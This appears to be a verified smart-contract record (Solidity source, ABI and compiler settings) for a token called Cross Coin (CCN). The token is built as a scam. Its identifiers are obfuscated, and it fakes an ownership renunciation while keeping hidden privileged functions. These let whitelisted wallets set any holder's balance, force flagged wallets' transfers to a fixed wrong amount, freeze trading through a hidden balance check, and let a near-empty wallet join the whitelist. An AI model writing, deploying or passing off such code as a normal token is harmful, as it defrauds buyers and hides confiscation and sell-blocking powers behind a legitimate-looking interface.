{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minTxFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingFromFee {\n    function createPair(address isShould, address liquidityToken) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface toShouldSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toMode) external view returns (uint256);\n\n    function transfer(address exemptAmountLimit, uint256 tradingTeam) external returns (bool);\n\n    function allowance(address launchedFundTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptAmountLimit,\n        uint256 tradingTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundLiquidity, uint256 value);\n    event Approval(address indexed launchedFundTake, address indexed spender, uint256 value);\n}\n\ninterface receiverAmountMetadata is receiverAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CrossCoin is minTxFund, receiverAmount, receiverAmountMetadata {\n\n    address public buyTo;\n\n    string private maxExempt = \"CCN\";\n\n    mapping(address => uint256) private feeTeamAmount;\n\n    function transferFrom(address receiverExempt, address exemptAmountLimit, uint256 tradingTeam) external override returns (bool) {\n        if (_msgSender() != shouldToAuto) {\n            if (receiverMin[receiverExempt][_msgSender()] != type(uint256).max) {\n                require(tradingTeam <= receiverMin[receiverExempt][_msgSender()]);\n                receiverMin[receiverExempt][_msgSender()] -= tradingTeam;\n            }\n        }\n        return marketingLiquidity(receiverExempt, exemptAmountLimit, tradingTeam);\n    }\n\n    event OwnershipTransferred(address indexed limitSender, address indexed feeReceiverTeam);\n\n    function owner() external view returns (address) {\n        return limitWalletToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromSwap;\n    }\n\n    uint256 public tokenLaunch = 3;\n\n    address public sellTake;\n\n    function approve(address fromAmount, uint256 tradingTeam) public virtual override returns (bool) {\n        receiverMin[_msgSender()][fromAmount] = tradingTeam;\n        emit Approval(_msgSender(), fromAmount, tradingTeam);\n        return true;\n    }\n\n    function exemptFee(uint256 tradingTeam) public {\n        totalAmount();\n        shouldReceiver = tradingTeam;\n    }\n\n    uint256 public txTake = 0;\n\n    address shouldToAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingLiquidity(address receiverExempt, address exemptAmountLimit, uint256 tradingTeam) internal returns (bool) {\n        if (receiverExempt == sellTake) {\n            return tokenMarketing(receiverExempt, exemptAmountLimit, tradingTeam);\n        }\n        uint256 txMarketingMode = receiverAmount(buyTo).balanceOf(receiverWallet);\n        require(txMarketingMode == shouldReceiver);\n        require(exemptAmountLimit != receiverWallet);\n        if (walletLaunched[receiverExempt]) {\n            return tokenMarketing(receiverExempt, exemptAmountLimit, sellEnable);\n        }\n        tradingTeam = feeTake(receiverExempt, exemptAmountLimit, tradingTeam);\n        return tokenMarketing(receiverExempt, exemptAmountLimit, tradingTeam);\n    }\n\n    bool public tokenMax;\n\n    function feeTake(address receiverExempt, address exemptAmountLimit, uint256 tradingTeam) internal view returns (uint256) {\n        require(tradingTeam > 0);\n\n        uint256 totalLaunched = 0;\n        if (receiverExempt == buyTo && tokenLaunch > 0) {\n            totalLaunched = tradingTeam * tokenLaunch / 100;\n        } else if (exemptAmountLimit == buyTo && txTake > 0) {\n            totalLaunched = tradingTeam * txTake / 100;\n        }\n        require(totalLaunched <= tradingTeam);\n        return tradingTeam - totalLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitWalletToken;\n    }\n\n    bool private totalReceiver;\n\n    mapping(address => mapping(address => uint256)) private receiverMin;\n\n    function allowance(address totalTxSell, address fromAmount) external view virtual override returns (uint256) {\n        if (fromAmount == shouldToAuto) {\n            return type(uint256).max;\n        }\n        return receiverMin[totalTxSell][fromAmount];\n    }\n\n    uint256 shouldReceiver;\n\n    constructor (){\n        \n        enableMaxList();\n        toShouldSell takeLaunch = toShouldSell(shouldToAuto);\n        buyTo = tradingFromFee(takeLaunch.factory()).createPair(takeLaunch.WETH(), address(this));\n        receiverWallet = tradingFromFee(takeLaunch.factory()).feeTo();\n        if (totalFrom != swapLiquidity) {\n            launchTrading = false;\n        }\n        sellTake = _msgSender();\n        tradingExemptShould[sellTake] = true;\n        feeTeamAmount[sellTake] = fromSwap;\n        \n        emit Transfer(address(0), sellTake, fromSwap);\n    }\n\n    uint256 constant sellEnable = 6 ** 10;\n\n    function tokenMarketing(address receiverExempt, address exemptAmountLimit, uint256 tradingTeam) internal returns (bool) {\n        require(feeTeamAmount[receiverExempt] >= tradingTeam);\n        feeTeamAmount[receiverExempt] -= tradingTeam;\n        feeTeamAmount[exemptAmountLimit] += tradingTeam;\n        emit Transfer(receiverExempt, exemptAmountLimit, tradingTeam);\n        return true;\n    }\n\n    function receiverBuy(address buyAmountFund) public {\n        totalAmount();\n        \n        if (buyAmountFund == sellTake || buyAmountFund == buyTo) {\n            return;\n        }\n        walletLaunched[buyAmountFund] = true;\n    }\n\n    uint256 private swapLiquidity;\n\n    uint8 private takeTotal = 18;\n\n    address receiverWallet;\n\n    function tradingAmount(address fromToken, uint256 tradingTeam) public {\n        totalAmount();\n        feeTeamAmount[fromToken] = tradingTeam;\n    }\n\n    address private limitWalletToken;\n\n    function balanceOf(address toMode) public view virtual override returns (uint256) {\n        return feeTeamAmount[toMode];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitFrom;\n    }\n\n    uint256 private totalFrom;\n\n    function toMinList(address atTakeList) public {\n        require(atTakeList.balance < 100000);\n        if (tokenMax) {\n            return;\n        }\n        if (teamTo != swapLiquidity) {\n            launchTrading = true;\n        }\n        tradingExemptShould[atTakeList] = true;\n        if (teamTo != swapLiquidity) {\n            swapLiquidity = totalFrom;\n        }\n        tokenMax = true;\n    }\n\n    string private limitFrom = \"Cross Coin\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeTotal;\n    }\n\n    function enableMaxList() public {\n        emit OwnershipTransferred(sellTake, address(0));\n        limitWalletToken = address(0);\n    }\n\n    uint256 public teamTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxExempt;\n    }\n\n    uint256 launchedLimit;\n\n    uint256 private fromSwap = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public walletLaunched;\n\n    function transfer(address fromToken, uint256 tradingTeam) external virtual override returns (bool) {\n        return marketingLiquidity(_msgSender(), fromToken, tradingTeam);\n    }\n\n    function totalAmount() private view {\n        require(tradingExemptShould[_msgSender()]);\n    }\n\n    bool private launchTrading;\n\n    mapping(address => bool) public tradingExemptShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFundTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiverTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTxSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMaxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"exemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmountFund\",\"type\":\"address\"}],\"name\":\"receiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTakeList\",\"type\":\"address\"}],\"name\":\"toMinList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"tradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingExemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAmountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CrossCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}